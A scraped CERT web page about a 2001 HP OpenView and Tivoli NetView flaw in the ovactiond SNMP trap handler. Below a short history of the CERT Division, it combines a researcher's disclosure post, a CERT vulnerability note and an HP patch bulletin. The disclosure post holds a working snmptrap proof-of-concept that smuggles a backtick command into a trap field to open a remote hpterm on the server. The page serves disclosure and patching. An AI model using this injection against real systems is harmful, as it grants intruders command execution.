## History

The CERT Division is the birthplace of cybersecurity. For nearly 30 years, the CERT Division of the SEI has partnered with government, industry, law enforcement, and academia to advance cybersecurity and improve the security and resilience of computer systems and networks.

Originally focused on incident response, we have expanded into cybersecurity areas such as network situational awareness, malicious code analysis, secure coding, resilience management, insider threats, digital investigations and intelligence, workforce development, DevOps, forensics, software assurance, vulnerability discovery and analysis, and risk management.

## Former Director Richard Pethia

[Richard Pethia](/about/leadership/display.cfm?customel_datapageid_2623=3545) was founding director of the SEI's CERT Division. Pethia, who served as director of CERT from 1988 to 2016, guided the organization through tremendous growth and change. Under Pethia's leadership, the unit expanded and evolved from the CERT Coordination Center—a small group focused on computer incident response—to a research organization of more than 200 professionals dedicated to solving problems with widespread cybersecurity implications.

Hello,

Summery:
HP Openview NNM6.1 and earlier running on unix
have a problem with the suid bin executable
ovactiond. It allows for starting of any program by just
sending a trap or event to the station running the
daemon.

Details:
in the trapd.conf the following is defined by default
(NNM6.1):
#
EVENT
OV_MgX_NNM_Generic .1.3.6.1.4.1.11.2.17.1.0.6000
0208 "Configuration Alarms" Warning
FORMAT Generic NNM to MgX message. $12
EXEC echo snmpnotify -v 1 -e 1.3.6.1.4.1.11.2.17.1
$10 1.3.[snip...]
#

by sending this trap:
snmptrap -v 1 <NNM host> .1.3.6.1.4.1.11.2.17.1
1.2.3.4 6 60000208 0 1 s "" 2 s "" 3
s "\`/usr/bin/X11/hpterm -display <your client
display>\`" 4 s "" [snip...] 12 s ""

You get an hpterm on your client display running
under user bin on the NNM server.

The reason is that NNM first completes the command
under the EXEC and then starts that in a shell.

Path:
the patch to install is PHSS_23779 and is default in
all newest patch releases of NNM. This patch checks
for 'strange' characters in the input strings received
through the event or trap.

MAG,
Milo

PS: moderator, please inform me why you do/did not

## Hewlett Packard OpenView and Tivoli NetView do not adequately validate SNMP trap arguments

#### Vulnerability Note VU#952171

Original Release Date: 2001-06-21 | Last Revised: 2001-09-06

---

### Overview

Hewlett Packard's (HP) OpenView and Tivoli NetView are system management software packages. There is a vulnerability a component of these packages, ovactiond, that allows intruders to execute arbitrary commands as user bin. This may subsequently lead to a root compromise.

### Description

| HP [OpenView](http://www.openview.hp.com/) and Tivoli [NetView](http://www.tivoli.com/products/index/netview/) are set of tools to manage large networks. Part of OpenView and NetView is a daemon called ovactiond, which is the SNMP trap and event handler. It is possible for an intruder to execute arbitrary commands by sending a malicious message to a vulnerable version of ovactiond. These commands run with the privileges of the ovactiond process, typically bin on Unix systems, and SYSTEM on Windows NT/2000. Often it is possible to use this access to gain root access on Unix systems. An exploit is publicly available. Note that Tivoli NetView is not vulnerable via the default configuration, however, it is likely that customized configurations are vulnerable HP is vulnerable by the default configuration.  For more information, see HP Security Bulletin HPSBUX0106-154 and <http://www.tivoli.com/support/>. It has been confirmed with HP that the patch referenced on Security Focus for OpenView Version 5.01 is only for Version 6.1. |
| --- |

### Impact

| An intruder can execute arbitrary commands with the privileges of the ovactiond process, typically bin on Unix systems, and SYSTEM on Window NT/2000 systems. |
| --- |

### Solution

| Apply patches from your vendor as appropriate. HP has released HP Security Bulletin HPSBUX0106-154. Tivoli has information posted on <http://www.tivoli.com/support/>. |

 ---------------------------------------------------------------

The information in the following Security Bulletin should be
acted upon as soon as possible. Hewlett-Packard Company will
not be liable for any consequences to any customer resulting
from customer's failure to fully implement instructions in this
Security Bulletin as soon as possible.

 ---------------------------------------------------------------

PROBLEM: It is possible to gain unauthorized privileges
 in OpenView Network Node Manager.

PLATFORM: HP9000 Servers running HP-UX releases 10.20 and
 11.00 (only).
 Sun Microsystems SOLARIS releases 2.X
 Microsoft Windows NT4.X / Windows 2000
 running NNM 6.1

DAMAGE: A malicious user may obtain unauthorized privileges under
 certain conditions.

SOLUTION: Apply one of these patches:
 HP-UX 11.00 HP-UX 10.20 SOLARIS 2.X WinNT4.X/2000
 PHSS\_23780 PHSS\_23779 PSOV\_02905 NNM\_00698
\*\*REV 01\*\*
 ------>> Note: NNM 6.2 is not vulnerable.

AVAILABILITY: These four patches are Special Release patches are
 available only from
<http://ovweb.external.hp.com/cpe/patches/>
 They are not available from the ITRC.

CHANGE SUMMARY: Clarification in Section B below and the SOLUTION
 section above.
 --------------------------------------------------------------------
 A. Background
 Hewlett-Packard Company has been notified of a vulnerability
 in its OpenView Network Node Manager. It is possible to gain
 unauthorized privileges.

 B. Fixing the problem
 Apply one of these patches:
 HP-UX 11.00 HP-UX 10.20 SOLARIS 2.X WinNT4.X/2000
 PHSS\_23780 PHSS\_23779 PSOV\_02905 NNM\_00698

 or a superseding patch.
 Searching <http://ovweb.external.hp.com/cpe/patches/> for one
 of the patch numbers above will direct you to the latest
 superseding patch.

\*\*REV 01\*\*
 ------>> Although versions of NNM prior to NNM 6.1 are not
 ------>> vulnerable in their default configuration, it is possible
 ------>> to modify the default configuration so as to make those
 ------>> versions vulnerable. Therefore, we recommend that all
 ------>> customers update to NNM 6.2 or install the appropriate
 ------>> patches for NNM 6.1.
 ------>>
 ------>> The patches listed above have been superseeded. If you
 ------>> have NNM 6.1 and have installed one of the patches listed
 ------>> above, no further action is required. The patches listed
 ------>> above are no longer available. These are the latest patches
 ------>> that solve the security problem in NNM 6.1:
 ------>>
 ------>> HP-UX 11.00 HP-UX 10.20 SOLARIS 2.X WinNT4.X/2000
 ------>> PHSS\_24443 PHSS\_24442 PSOV\_02956 NNM\_00743
 ------>>
 ------>> Note: one way to determine whether NNM is installed on
 ------>> your system is to run the following command:
 ------>>
 ------>> swlist | grep "Network Node Manager"
